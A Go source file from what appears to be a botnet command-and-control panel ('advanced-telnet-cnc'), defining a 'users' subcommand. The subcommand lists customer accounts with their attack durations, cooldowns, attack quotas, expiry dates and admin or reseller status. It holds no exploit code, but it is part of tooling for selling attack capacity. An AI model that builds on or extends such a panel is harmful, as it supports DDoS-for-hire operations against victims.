package subcommands

import (
	"advanced-telnet-cnc/packages/format"
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"sort"
	"strings"
	"time"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases: []string{"view", "list"},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "Attacks"},
					{Align: simpletable.AlignCenter, Text: "Account Expiry"},
				},
			}

			users, err := database.Users()
			if err != nil {
				return err
			}

			sortUsers(users)

			for i, profile := range users {
				left, max, err := profile.Attacks()
				if err != nil {
					return err
				}

				var symbol = ""
				if winterTemp(max, left, 30) {
					symbol = "\u001B[93m⚠ \u001B[0m"
				}

				if profile.Admin {
					symbol = "\u001B[31m★ \u001B[0m"
				}

				if profile.Reseller {
					symbol = "\u001B[95m★ \u001B[0m"
				}

				r := []*simpletable.Cell{
					{Align: 0, Text: fmt.Sprintf("%d", i+1)},
					{Align: 0, Text: symbol + profile.Name},
					{Align: 0, Text: fmt.Sprintf("%d", profile.MaxTime)},
					{Align: 0, Text: fmt.Sprintf("%d", profile.Cooldown)},
					{Align: 0, Text: fmt.Sprintf("%d/%d", left, max)},
					{Align: 0, Text: format.Format(profile.Expiry)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompactLite)
			session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
			return session.Println(" \x1b[31m★ \x1b[0mAdministrator | \x1b[95m★ \x1b[0mReseller | \x1b[93m⚠ \x1b[0mHigh Attack Usage")
		},
	})
}

func sortUsers(users []*database.UserProfile) {
	sort.Slice(users, func(i, j int) bool {
		// Admins come first
		if users[i].Admin && !users[j].Admin {
			return true
		}

		// Resellers come after admins
		if users[i].Reseller && !users[j].Admin && !users[j].Reseller {
			return true
		}

		// Users with high attack usage come next
		leftI, maxI, errI := users[i].Attacks()
		if errI != nil {
			return false
		}

		leftJ, maxJ, errJ := users[j].Attacks()
		if errJ != nil {
			return true
		}

		if !users[i].Expiry.Before(time.Now()) && !users[j].Expiry.Before(time.Now()) {
			// Sort by attack usage for non-expired users
			if winterTemp(maxI, leftI, 30) && !winterTemp(maxJ, leftJ, 30) {
				return true
			}
		}

		// Non-expired users come next
		if !users[i].Expiry.Before(time.Now()) && users[j].Expiry.Before(time.Now()) {
			return true
		}

		if users[i].Expiry.Before(time.Now()) && !users[j].Expiry.Before(time.Now()) {
			return false
		}

		// Finally, sort by expiry date in descending order
		return users[i].Expiry.Unix() > users[j].Expiry.Unix()
	})
}

func winterTemp(total, used int, percent float64) bool {
	return (float64(total) - float64(used)) >= ((percent / 100.0) * float64(total))
}
